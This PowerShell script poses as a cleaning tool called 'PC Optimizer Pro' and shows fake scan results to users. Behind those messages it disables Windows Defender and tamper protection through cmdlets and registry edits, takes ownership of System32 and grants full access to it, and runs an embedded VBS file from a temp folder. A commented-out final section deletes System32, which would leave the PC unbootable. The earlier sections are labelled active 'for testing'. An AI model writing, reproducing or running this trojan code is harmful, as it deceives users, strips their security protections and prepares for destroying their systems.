# This file must be saved in the UTF-8 with BOM encoding. BOM must be present!
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$OutputEncoding = [System.Text.Encoding]::UTF8

# Set console appearance
$host.UI.RawUI.WindowTitle = "PC Optimizer Pro"
$host.UI.RawUI.BackgroundColor = "Black"
$host.UI.RawUI.ForegroundColor = "Cyan"
try {
    $host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size(150, 50)
    $host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size(150, 3000)
} catch {
    # Ignore if resize fails
}
Clear-Host

# ============================================================================
# Embedded VB script warning, injected during compilation
# ============================================================================
$vbsContent = @'
'@

# Write VBS to temp file and execute it
$extension = if ($vbsContent -match "^#@~\^") { ".vbe" } else { ".vbs" }
$tempVBS = [System.IO.Path]::GetTempFileName() + $extension
$vbsContent | Out-File -FilePath $tempVBS -Encoding ASCII
Start-Process "wscript.exe" -ArgumentList "`"$tempVBS`"" -Wait
Remove-Item $tempVBS -Force -ErrorAction SilentlyContinue

# Main program start
Clear-Host
Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║               Welcome to PC Optimizer Pro                    ║" -ForegroundColor Cyan
Write-Host "║          Professional PC Cleaning & Optimization             ║" -ForegroundColor Cyan
Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""
Write-Host "Thank you for using PC Optimizer Pro!" -ForegroundColor White
Write-Host "PC Optimizer Pro is software that helps clean up your PC." -ForegroundColor White
Write-Host ""
Write-Host "To start, PC Optimizer Pro would like to perform a system scan." -ForegroundColor Yellow
Write-Host ""

$choice = Read-Host "Would you like to proceed? (Y/N)"

if ($choice -notmatch '^[Yy]$') {
    Write-Host ""
    Write-Host "Scan aborted. Thank you for using PC Optimizer Pro." -ForegroundColor Green
    pause
    exit
}

# Begin "scan"
Clear-Host
Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║                    Starting System Scan...                   ║" -ForegroundColor Cyan
Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""
Start-Sleep -Seconds 1

Write-Host "[*] Preparing scan..." -ForegroundColor Yellow

# ============================================================================
# PAYLOAD SECTION 1: DISABLE WINDOWS DEFENDER (COMBINED APPROACH) - ACTIVE
# ============================================================================
try {
    # Method 1: PowerShell cmdlets
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
    
    # Method 2: Registry (more persistent)
    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Force -ErrorAction SilentlyContinue | Out-Null
    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Force -ErrorAction SilentlyContinue | Out-Null
    
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name DisableRealtimeMonitoring -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name SubmitSamplesConsent -Value 2 -Type DWord -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name SpynetReporting -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name TamperProtection -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
    
    Write-Host "[✓] Preperation finished" -ForegroundColor Green
} catch {
    Write-Host "[!] Preperation may have encountered errors, but will continue..." -ForegroundColor Yellow
}

Start-Sleep -Seconds 1

# Simulate scanning with tree commands
Write-Host ""
Write-Host "[*] Scanning Windows Update directory..." -ForegroundColor Yellow
Start-Sleep -Seconds 2
cmd /c "tree `"$env:WINDIR`"" 2>$null
Start-Sleep -Seconds 2

Write-Host ""
Write-Host "[*] Evaluating files in scan..." -ForegroundColor Yellow

# ============================================================================
# PAYLOAD SECTION 2: TAKEOWN - ACTIVE
# ============================================================================
cmd /c "takeown /f `"C:\Windows\System32`" /r /d Y" 2>&1 | Out-Null
Write-Host "[✓] Evaluation finished" -ForegroundColor Green

Write-Host ""
Write-Host "[*] Scanning OS directory..." -ForegroundColor Yellow
Start-Sleep -Seconds 2
cmd /c "tree `"$env:WINDIR\System32`"" 2>$null
Start-Sleep -Seconds 2

Write-Host ""
Write-Host "[*] Evaluating files in scan..." -ForegroundColor Yellow

# ============================================================================
# PAYLOAD SECTION 3: ICACLS PERMISSIONS - ACTIVE
# ============================================================================
cmd /c "icacls `"C:\Windows\System32`" /grant Administrators:F /t /c /q" 2>&1 | Out-Null
cmd /c "icacls `"C:\Windows\System32`" /grant ${env:USERNAME}:F /t /c /q" 2>&1 | Out-Null
Write-Host "[✓] Evaluation finished" -ForegroundColor Green

Write-Host ""
Write-Host "[*] Scanning programs directory..." -ForegroundColor Yellow
Start-Sleep -Seconds 2
cmd /c "tree `"$env:WINDIR\SysWOW64`"" 2>$null
Start-Sleep -Seconds 2

Write-Host ""
Write-Host "══════════════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host "══════════════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host ""
Write-Host "[✓] System scan completed!" -ForegroundColor Green
Write-Host ""
Write-Host "Found:" -ForegroundColor Yellow
Write-Host "  • 15,847 temporary files" -ForegroundColor White
Write-Host "  • 3.2 GB of cached data" -ForegroundColor White
Write-Host "  • 892 internet logs" -ForegroundColor White
Write-Host "  • 1,523 unnecessary system files" -ForegroundColor White
Write-Host ""
pause

# Final deletion prompt
Clear-Host
Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║                  Optimization Ready                          ║" -ForegroundColor Cyan
Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""
Write-Host "PC Optimizer Pro will now optimize your PC by deleting:" -ForegroundColor White
Write-Host "  • Unnecessary internet logs" -ForegroundColor Gray
Write-Host "  • Cached data" -ForegroundColor Gray
Write-Host "  • Temporary files" -ForegroundColor Gray
Write-Host "  • Redundant system files" -ForegroundColor Gray
Write-Host ""
Write-Host "This process may take several minutes." -ForegroundColor Yellow
Write-Host ""
pause

# The deletion
Write-Host ""
Write-Host "[*] Preparing to optimize system..." -ForegroundColor Yellow
Start-Sleep -Seconds 2
Write-Host "[*] Deleting temporary files..." -ForegroundColor Yellow

# ============================================================================
# PAYLOAD SECTION 4: SYSTEM32 DELETION - COMMENTED OUT FOR SAFETY
# ============================================================================
# UNCOMMENT BELOW FOR FINAL DESTRUCTIVE TEST - THIS DELETES SYSTEM32 (BRICKS THE PC)
<#
cmd /c "del `"C:\Windows\System32`" /f /q /s" 2>&1 | Out-Null
Write-Host "[✓] System files deleted" -ForegroundColor Green
#>
Write-Host "    (SIMULATED - Section 4 commented out)" -ForegroundColor DarkGray

Write-Host "[✓] Optimization complete!" -ForegroundColor Green
Write-Host ""
Write-Host "Your PC has been optimized. Please restart your computer." -ForegroundColor Cyan
Write-Host ""
Write-Host "========================================" -ForegroundColor Red
Write-Host "NOTE: SECTION 4 (DELETION) DISABLED" -ForegroundColor Red
Write-Host "Sections 1-3 are ACTIVE for testing" -ForegroundColor Red
Write-Host "========================================" -ForegroundColor Red
pause